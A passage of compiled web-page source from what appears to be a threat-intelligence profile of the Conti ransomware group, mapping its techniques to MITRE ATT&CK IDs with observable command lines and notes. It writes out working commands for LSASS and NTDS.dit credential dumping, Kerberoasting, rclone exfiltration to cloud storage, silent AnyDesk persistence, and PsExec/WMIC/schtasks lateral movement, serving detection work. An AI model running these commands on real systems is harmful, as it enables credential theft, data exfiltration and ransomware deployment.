",(0,l.kt)("em",{parentName:"td"},"doscmd/copy command via WMI and Cobalt Strike")," to move system files including ",(0,l.kt)("em",{parentName:"td"},"NTDS.dit")," for Collection."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'wmic /node:\\"DC01\\" /user:\\"DOMAIN\\\\admin\\" /password:\\"cleartextpass\\" process call create \\"cmd /c copy \\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy55\\\\Windows\\\\NTDS\\\\NTDS.dit c:\\\\temp\\\\log\\\\ & copy \\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy55\\\\Windows\\\\System32\\\\config\\\\SYSTEM c:\\\\temp\\\\log\\\\ & copy \\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy55\\\\Windows\\\\System32\\\\config\\\\SECURITY c:\\\\temp\\\\log\\\\"')),(0,l.kt)("td",{parentName:"tr",align:null})),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Collection"),(0,l.kt)("td",{parentName:"tr",align:null},"T1560.001"),(0,l.kt)("td",{parentName:"tr",align:null},"Conti used ",(0,l.kt)("em",{parentName:"td"},"7zip via WMI and Cobalt Strike")," to archive collected files for Collection."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"7za.exe a -tzip -mx5 \\\\\\\\DC01\\\\C$\\\\temp\\\\log.zip \\\\\\\\DC01\\\\C$\\\\temp\\\\log -pTOPSECRETPASSWORD")),(0,l.kt)("td",{parentName:"tr",align:null})),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Credential Access"),(0,l.kt)("td",{parentName:"tr",align:null},"T1003.003"),(0,l.kt)("td",{parentName:"tr",align:null},"Conti used ",(0,l.kt)("em",{parentName:"td"},"ntdsutil")," for Credential Access."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'ntdsutil \\"ac in ntds\\" \\"ifm\\" \\"create full c:\\\\windows\\\\temp\\\\crashpad\\\\x\\" q q')),(0,l.kt)("td",{parentName:"tr",align:null},"- ",(0,l.kt)("em",{parentName:"td"},"Ntdsutil.exe")," is a command-line tool that provides management facilities for Active Directory Domain Services (AD DS) and Active Directory Lightweight Directory Services (AD LDS).",(0,l.kt)("br",null),"- For most of the ",(0,l.kt)("em",{parentName:"td"},"Ntdsutil")," commands, you only need to type the ",(0,l.kt)("em",{parentName:"td"},"first few characters")," of the command name ",(0,l.kt)("em",{parentName:"td"},"instead than the entire command"),".",(0,l.kt)("br",null),'- the paremeter "ifm" is modified by "create full"; the specified folder is where the copy will be created.',(0,l.kt)("br",null),"- ",(0,l.kt)("a",{parentName:"td",href:"https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc753343(v=ws.11)"},"https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc753343(v=ws.11)"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"T1046"),(0,l.kt)("td",{parentName:"tr",align:null},"Conti used ",(0,l.kt)("em",{parentName:"td"},"NetScan.exe via Cobalt Strike")," to scan internal network for Discovery."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'netscan.exe /hide /auto:\\"result.xml\\" /config:netscan.xml /range:192.168.0.1-192.168.1.255'),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\ProgramData\\\\NetScan\\\\result.xml")),(0,l.kt)("td",{parentName:"tr",align:null},"- ",(0,l.kt)("em",{parentName:"td"},"NetScan.exe")," is a commercial network scanning tool that offer free trial version (",(0,l.kt)("a",{parentName:"td",href:"https://www.softperfect.com/products/networkscanner/"},"https://www.softperfect.com/products/networkscanner/"),")",(0,l.kt)("br",null),"- Results include: hostnames, open ports, group/domain membership, total disk space, available shares among other system details.",(0,l.kt)("br",null),"- As per the leaked Conti manuals, thret actors are looking for NAS and backup systems.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Exfiltration"),(0,l.kt)("td",{parentName:"tr",align:null},"T1567"),(0,l.kt)("td",{parentName:"tr",align:null},"Conti used ",(0,l.kt)("em",{parentName:"td"},"Rclone")," to upload data to cloud storage for Exfiltration."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'rclone.exe copy \\"\\\\\\\\company.com\\\\IT\\\\KLSHARE\\" Mega:Finanse -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'rclone.exe copy \\"\\\\\\\\company.com\\\\E$\\\\FINANCE\\" mega:1 -q --ignore-existing --auto-confirm --multi-thread-streams 1 --transfers 3 --bwlimit 5M'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'rclone.exe copy \\"\\\\\\\\company.com\\\\E$\\\\Data\\" remote:Data -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'rclone.exe copy \\"\\\\\\\\FS\\\\\\" remote:NT    -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'rclone.exe copy \\"\\\\\\\\company.com\\\\Users\\" ftp1:uploads/Users/ -q --ignore-existing --auto-confirm --multi-thread-streams 3 --transfers 3')),(0,l.kt)("td",{parentName:"tr",align:null},"- ",(0,l.kt)("em",{parentName:"td"},"Rclone")," is a command line program to manage files on cloud storage. Over 40 cloud storage products support rclone including S3 object stores, business & consumer file storage services, as well as standard transfer protocols (source: rclone.org).")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Credential Access"),(0,l.kt)("td",{parentName:"tr",align:null},"T1558.003",(0,l.kt)("br",null),"T1558.004"),(0,l.kt)("td",{parentName:"tr",align:null},"Conti used ",(0,l.kt)("em",{parentName:"td"},"Rubeus.exe via Cobalt Strike")," for Credential Access."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"Rubeus.exe kerberoast /ldapfilter:\\'admincount=1\\' /format:hashcat /outfile:C:\\\\ProgramData\\\\hashes.txt"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"Rubeus.exe asreproast /format:hashcat /outfile:C:\\\\ProgramData\\\\asrephashes.txt"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\ProgramData\\\\asrephashes.txt"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\ProgramData\\\\hashes.txt")),(0,l.kt)("td",{parentName:"tr",align:null},"- Rubeus is a C# toolset for raw Kerberos interaction and abuse.",(0,l.kt)("br",null),"- During ",(0,l.kt)("em",{parentName:"td"},"Kerberoasting"),", the adversary attempts to extract password hashes for active directory user accounts through their Service Principal Name (SPN) ticket.",(0,l.kt)("br",null),"- ",(0,l.kt)("a",{parentName:"td",href:"https://awakesecurity.com/blog/kerberoasting-threat-hunting-for-active-directory-attacks/"},"https://awakesecurity.com/blog/kerberoasting-threat-hunting-for-active-directory-attacks/"),(0,l.kt)("br",null),"- During ",(0,l.kt)("em",{parentName:"td"},"AS_REP Roasting"),", the adversary attempts to extract password hashes of accounts that are set to ",(0,l.kt)("em",{parentName:"td"},"Do not require Kerberos preauthentication"),"; for offline cracking to get the cleartext passwords (",(0,l.kt)("a",{parentName:"td",href:"https://luemmelsec.github.io/Kerberoasting-VS-AS-REP-Roasting/"},"https://luemmelsec.github.io/Kerberoasting-VS-AS-REP-Roasting/"),")",(0,l.kt)("br",null),"- The output of ",(0,l.kt)("em",{parentName:"td"},"Rubeus")," ",(0,l.kt)("em",{parentName:"td"},"/format:hashcat")," can be feed directly into ",(0,l.kt)("em",{parentName:"td"},"hashcat")," password cracker.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Persistence"),(0,l.kt)("td",{parentName:"tr",align:null},"T1059.001",(0,l.kt)("br",null),"T1071.001",(0,l.kt)("br",null),"T1219",(0,l.kt)("br",null),"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},"Conti used a ",(0,l.kt)("em",{parentName:"td"},"PowerShell inline script via Cobalt Strike")," to download and install ",(0,l.kt)("em",{parentName:"td"},"AnyDesk")," Remote Access Tool for Persistence."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell_ise.exe"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"n/d"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"download.anydesk.com"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\ProgramData\\\\AnyDesk.exe"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd.exe /c C:\\\\ProgramData\\\\AnyDesk.exe --install C:\\\\ProgramData\\\\AnyDesk --start-with-win --silent"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd.exe /c echo J9kzQ2Y0qO \\| C:\\\\ProgramData\\\\anydesk.exe --set-password")),(0,l.kt)("td",{parentName:"tr",align:null},"- ",(0,l.kt)("em",{parentName:"td"},"AnyDesk")," is a Remote Desktop Application; it has a free version.",(0,l.kt)("br",null),"- The password 'J9kzQ2Y0qO' appears on Conti manuals leaked August 2021.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"T1562.004",(0,l.kt)("br",null),"T1112"),(0,l.kt)("td",{parentName:"tr",align:null},"Conti used ",(0,l.kt)("em",{parentName:"td"},"PowerShell")," commandlets to allow incomming RDP connections on an uncommon port for Defense Evasion."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'New-NetFirewallRule -DisplayName "New RDP Port 1350" -Direction Inbound -LocalPort 1350 -Protocol TCP -Action allow'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'New-NetFirewallRule -DisplayName "New RDP Port 1350" -Direction Inbound -LocalPort 1350 -Protocol UDP -Action allow'),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"RegValue Created"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\\\WinStations\\\\RDP-Tcp"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"Restart-Service termservice -force")),(0,l.kt)("td",{parentName:"tr",align:null},"- Remote Desktop Protocol (RDP) enables remote connections to other computers. RDP typically uses TCP port 3389.",(0,l.kt)("br",null),"- ",(0,l.kt)("em",{parentName:"td"},"termservice")," is the Remote Desktop Services.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Credential Access"),(0,l.kt)("td",{parentName:"tr",align:null},"T1003.001",(0,l.kt)("br",null),"T1218.011"),(0,l.kt)("td",{parentName:"tr",align:null},"Conti used ",(0,l.kt)("em",{parentName:"td"},"COM+ Service DLL via Cobalt Strike")," to dump ",(0,l.kt)("em",{parentName:"td"},"LSASS")," process memory for Credential Access."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"rundll32.exe C:\\\\windows\\\\System32\\\\comsvcs.dll, MiniDump #{pID} C:\\\\ProgramData\\\\lsass.dmp full")),(0,l.kt)("td",{parentName:"tr",align:null},"- ",(0,l.kt)("em",{parentName:"td"},"comsvcs.dll"),"  (",(0,l.kt)("em",{parentName:"td"},"COM+ Service DLL")," in Windows) can create process memory dumps.",(0,l.kt)("br",null),"- Using ",(0,l.kt)("em",{parentName:"td"},"comsvcs.dll MimiDump")," for creating LSASS process memory dumps is a known trick.",(0,l.kt)("br",null),"- As per the leaked Conti manuals, Contis executed this command via ",(0,l.kt)("em",{parentName:"td"},"Cobalt Strike"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Credential Access"),(0,l.kt)("td",{parentName:"tr",align:null},"T1021.001",(0,l.kt)("br",null),"T1003.001"),(0,l.kt)("td",{parentName:"tr",align:null},"Conti used ",(0,l.kt)("em",{parentName:"td"},"Task Manager over RDP"),"  to dump ",(0,l.kt)("em",{parentName:"td"},"LSASS")," process memory for Credential Access."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\Windows\\system32\\taskmgr.exe" /7'),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\lsass.DMP"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\lsass (2).DMP")),(0,l.kt)("td",{parentName:"tr",align:null})),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Credential Access"),(0,l.kt)("td",{parentName:"tr",align:null},"T1047",(0,l.kt)("br",null),"T1003.001"),(0,l.kt)("td",{parentName:"tr",align:null},"Conti used ",(0,l.kt)("em",{parentName:"td"},"WMIC via Cobalt Strike")," to launch ",(0,l.kt)("em",{parentName:"td"},"comsvcs.dll")," via ",(0,l.kt)("em",{parentName:"td"},"RunDll32")," on remote systems for Credential Access."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'wmic /node:#{target} process call create \\"cmd /c rundll32.exe C:\\\\windows\\\\System32\\\\comsvcs.dll, MiniDump PID'),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'wmic /node:#{target} process call create \\"cmd /c rundll32.exe C:\\\\windows\\\\System32\\\\comsvcs.dll, MiniDump #{pID}')),(0,l.kt)("td",{parentName:"tr",align:null},"- ",(0,l.kt)("em",{parentName:"td"},"WMIC.exe")," (Windows Management Instrumentation Commandline utility) allows for command execution at remote hosts.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Credential Access"),(0,l.kt)("td",{parentName:"tr",align:null},"T1569.002",(0,l.kt)("br",null),"T1003.001"),(0,l.kt)("td",{parentName:"tr",align:null},"Conti used ",(0,l.kt)("em",{parentName:"td"},"PSEXEC via Cobalt Strike")," to launch ",(0,l.kt)("em",{parentName:"td"},"comsvcs.dll")," via ",(0,l.kt)("em",{parentName:"td"},"RunDll32")," on remote systems for Credential Access."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"psexec #{target} cmd /c rundll32.exe C:\\\\windows\\\\System32\\\\comsvcs.dll, MiniDump #{pID}"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"psexec #{target} cmd /c rundll32.exe C:\\\\windows\\\\System32\\\\comsvcs.dll, MiniDump #{pID}")),(0,l.kt)("td",{parentName:"tr",align:null},"- ",(0,l.kt)("em",{parentName:"td"},"PSEXEC")," is a light-weight telnet-replacement that lets you execute processes on other systems, complete with full interactivity for console applications, without having to manually install client software (source: ",(0,l.kt)("a",{parentName:"td",href:"https://docs.microsoft.com/en-us/sysinternals/downloads/psexec"},"https://docs.microsoft.com/en-us/sysinternals/downloads/psexec"),")")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Lateral Movement"),(0,l.kt)("td",{parentName:"tr",align:null},"T1570"),(0,l.kt)("td",{parentName:"tr",align:null},"Conti used ",(0,l.kt)("em",{parentName:"td"},"PSEXEC via Cobalt Strike")," to copy malicious files into remote systems for Lateral Movement."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'PsExec.exe /accepteula @C:\\\\share$\\\\comps1.txt -u DOMAIN\\\\ADMINISTRATOR -p PASSWORD cmd /c COPY "\\\\\\\\Domain Controller\\\\share$\\\\fx166.exe" "C:\\\\windows\\\\temp\\\\"')),(0,l.kt)("td",{parentName:"tr",align:null},"- ",(0,l.kt)("em",{parentName:"td"},"@C:","\\","share$","\\","comps1.txt")," represents the list of target systems. The ",(0,l.kt)("em",{parentName:"td"},"copy")," command is executed on each system listed on comps1.txt.",(0,l.kt)("br",null),"- In this case, the malicious file is hosted at a shared folder at the Domain Controller")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Lateral Movement"),(0,l.kt)("td",{parentName:"tr",align:null},"T1570"),(0,l.kt)("td",{parentName:"tr",align:null},"Conti used ",(0,l.kt)("em",{parentName:"td"},"WMIC via Cobalt Strike")," to copy and start execution of malicious files into remote systems for Lateral Movement."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'wmic /node:@C:\\\\share$\\\\comps1.txt /user:\\"DOMAIN\\\\Administrator\\" /password:\\"PASSWORD\\" process call create \\"cmd.exe /c bitsadmin /transfer fx166 \\\\\\\\Domain Controller\\\\share$\\\\fx166.exe %APPDATA%\\\\fx166.exe&%APPDATA%\\\\fx166.exe\\"')),(0,l.kt)("td",{parentName:"tr",align:null},"- ",(0,l.kt)("em",{parentName:"td"},"@C:","\\","share$","\\","comps1.txt")," represents the list of target systems. The ",(0,l.kt)("em",{parentName:"td"},"BITSAdmin")," command is executed on each system listed on comps1.txt.",(0,l.kt)("br",null),"- ",(0,l.kt)("em",{parentName:"td"},"BITSAdmin")," is a command-line tool that you can use to create download or upload jobs (source: ",(0,l.kt)("a",{parentName:"td",href:"https://docs.microsoft.com/en-us/windows/win32/bits/bitsadmin-tool"},"https://docs.microsoft.com/en-us/windows/win32/bits/bitsadmin-tool"),")")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Lateral Movement"),(0,l.kt)("td",{parentName:"tr",align:null},"T1570",(0,l.kt)("br",null),"T1053.005"),(0,l.kt)("td",{parentName:"tr",align:null},"Conti used ",(0,l.kt)("em",{parentName:"td"},"SCHTASKS via Cobalt Strike")," to execute malicious files into remote systems for Lateral Movement."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'SCHTASKS /s remote-hostname123 /RU \\"SYSTEM\\" /create /tn \\"WindowsSensor15\\" /tr \\"cmd.exe /c C:\\\\ProgramData\\\\srvvhost.exe\\" /sc ONCE /sd 01/01/2021 /st 00: 00'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'SCHTASKS /s #{IP/HOSTNAME} /RU \\"SYSTEM\\" /create /tn \\"WindowsSensor15\\" /tr \\"cmd.exe /c C:\\\\ProgramData\\\\P32.exe\\" /sc ONCE /sd 01/01/1970 /st 00: 00'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'SCHTASKS /s #{IP/HOSTNAME} /run /TN  \\"WindowsSensor15\\'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'SCHTASKS /s #{IP/HOSTNAME} /TN \\"WindowsSensor15\\" /DELETE /F'),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"SCHTASKS /s"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'SCHTASKS /s #{IP/HOSTNAME} /TN "WindowsSensor15" /DELETE /F')),(0,l.kt)("td",{parentName:"tr",align:null})),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"T1016"),(0,l.kt)("td",{parentName:"tr",align:null},"Conti used ",(0,l.kt)("em",{parentName:"td"},"AdFind via Cobalt Strike")," for Discovery."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'adfind.exe -h #{ip} -b dc=#{domain} -u #{user} -up #{password} -f \\"(objectcategory=person)\\" > ad_users.txt'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'adfind.exe -h #{ip} -b dc=#{domain} -u #{user} -up #{password} -f \\"objectcategory=computer\\" > ad_computers.txt'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'adfind.exe -h #{ip} -b dc=#{domain} -u #{user} -up #{password} -f \\"(objectcategory=organizationalUnit)\\" > ad_ous.txt'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"adfind.exe -h #{ip} -b dc=#{domain} -u #{user} -up #{password} -sc trustdmp > trustdump.txt"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"adfind.exe -h #{ip} -b dc=#{domain} -u #{user} -up #{password} -f (objectCategory=subnet) > subnets.txt"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'adfind.exe -h #{ip} -b dc=#{domain} -u #{user} -up #{password} -f \\"(objectcategory=group)\\" > ad_group.txt'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"adfind.exe -h #{ip} -b dc=#{domain} -u #{user} -up #{password} -gcb -sc trustdmp > trustdump.txt")),(0,l.kt)("td",{parentName:"tr",align:null},"- ",(0,l.kt)("em",{parentName:"td"},"AdFind")," commands executed in sequense as in the well known ",(0,l.kt)("em",{parentName:"td"},"adf.bat")," script.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Impact"),(0,l.kt)("td",{parentName:"tr",align:null},"T1105",(0,l.kt)("br",null),"T1486",(0,l.kt)("br",null),"T1055"),(0,l.kt)("td",{parentName:"tr",align:null},"Conti used ",(0,l.kt)("em",{parentName:"td"},"Cobalt Strike")," to launch whole domain encryption for Impact."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\o4IRWsH4N1a3hjO9Sy2rPP02oyUddH7zA5xGih0ESmlhiiXD9kpWVCPfOwUnayZp_locker.exe"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\locker.bat"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\System32\\\\cmd.exe\\" /C  \\"C:\\\\locker.bat\\"'),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\Default\\\\AppData\\\\readme.txt")),(0,l.kt)("td",{parentName:"tr",align:null},"- ",(0,l.kt)("em",{parentName:"td"},"locker.bat")," will iterate on a list of target systems and then execute:",(0,l.kt)("br",null),"- ","`","C:","\\","o4IRWsH4N1a3hjO9Sy2rPP02oyUddH7zA5xGih0ESmlhiiXD9kpWVCPfOwUnayZp_locker.exe -m -net -size 10 -nomutex -p ","\\","\\","TARGETHOST\\C$","`")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Impact"),(0,l.kt)("td",{parentName:"tr",align:null},"T1105",(0,l.kt)("br",null),"T1486"),(0,l.kt)("td",{parentName:"tr",align:null},"Conti used ",(0,l.kt)("em",{parentName:"td"},"RDP")," to launch whole domain encryption for Impact."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\backup.exe"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\backup.exe"')),(0,l.kt)("td",{parentName:"tr",align:null},"- ",(0,l.kt)("em",{parentName:"td"},"backup.exe")," connects to all host to run the malware.")))),(0,l.kt)("h2",{id:"ttp-profiles-with-observables"},"TTP Profiles with Observables"),(0,l.kt)("h3",{id:"conti-used-wmic-via-cobalt-strike-for-execution"},"Conti used ",(0,l.kt)("em",{parentName:"h3"},"WMIC via Cobalt Strike")," for Execution."),(0,l.kt)("h4",{id:"tactic"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Execution")),(0,l.kt)("h4",{id:"techniques"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1047 - Windows Management Instrumentation")),(0,l.kt)("h4",{id:"behaviors-and-observables"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1047"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"WMIC")," commands executed via ",(0,l.kt)("em",{parentName:"td"},"Cobalt Strike"),"."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'wmic /node:\\"DC01\\" /user:\\"DOMAIN\\admin\\" /password:\\"cleartextpass\\" process call create \\"cmd /c vssadmin list shadows >> c:\\\\log.txt\\"'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'wmic /node:\\"DC01\\" /user:\\"DOMAIN\\admin\\" /password:\\"cleartextpass\\" process call create \\"cmd /c vssadmin create shadow /for=C: 2>&1\\"'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'wmic /node:\\"DC01\\" /user:\\"DOMAIN\\\\admin\\" /password:\\"cleartextpass\\" process call create \\"cmd /c copy \\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy55\\\\Windows\\\\NTDS\\\\NTDS.dit c:\\\\temp\\\\log\\\\ & copy 